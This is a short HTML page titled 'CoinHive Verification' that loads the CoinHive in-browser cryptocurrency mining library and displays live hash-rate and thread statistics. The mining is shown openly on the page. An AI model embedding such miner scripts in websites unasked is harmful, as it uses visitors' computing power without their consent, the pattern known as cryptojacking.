<!DOCTYPE html>
<head>
	<title>CoinHive Verification </title>
	<link rel="stylesheet" type="text/css" href="./css/main.css"/>
	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
	<script src="./js/verify.js"></script>
</head>
<body>
	<h1 style="border:2px solid green">Coinhive Verification</h1>
	<table>
		<tr style="color:yellow;">
			<th>Statistics:</th>
		</tr>
		<tr>
			<td>Hashes per second:</td>
			<td id="hps">0</td>
		</tr>
		<tr>
			<td>Hashes generated:</td>
			<td id="th">0</td>
		</tr>
		<tr>
			<td>Accepted hashes:</td>
			<td id="ah">0</td>
		</tr>
		<tr>
			<td>Number of threads: </td>
			<td id="threads">0</td>
		</tr>
	</table>
</body>
</html>
